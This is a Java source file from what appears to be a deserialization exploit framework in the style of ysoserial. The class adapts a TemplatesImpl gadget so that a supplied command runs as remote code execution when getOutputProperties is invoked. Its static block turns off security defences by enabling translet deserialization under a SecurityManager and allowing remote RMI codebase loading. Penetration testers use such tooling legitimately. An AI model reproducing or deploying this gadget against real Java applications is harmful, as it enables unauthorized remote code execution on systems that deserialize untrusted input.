package org.ses.gadgetbuilder.impl.adapters.getters;

import org.ses.gadgetbuilder.adapters.GetterMethodInvokeAdapter;
import org.ses.gadgetbuilder.impl.adapters.util.TemplatesImplGadget;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Impact;

import javax.xml.transform.Templates;

@Authors({Authors.FROHOFF})
@Impact(Impact.RCE)
public class TemplatesImplMethodInvokeAdapter extends GetterMethodInvokeAdapter {

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    @Override
    public Object getInvocationTarget(String command) throws Exception {
        return TemplatesImplGadget.createTemplatesImpl(command);
    }

    @Override
    public String getMethodName() {
        return "getOutputProperties";
    }

    @Override
    public Class<?> getTargetInterface() {
        return Templates.class;
    }


}
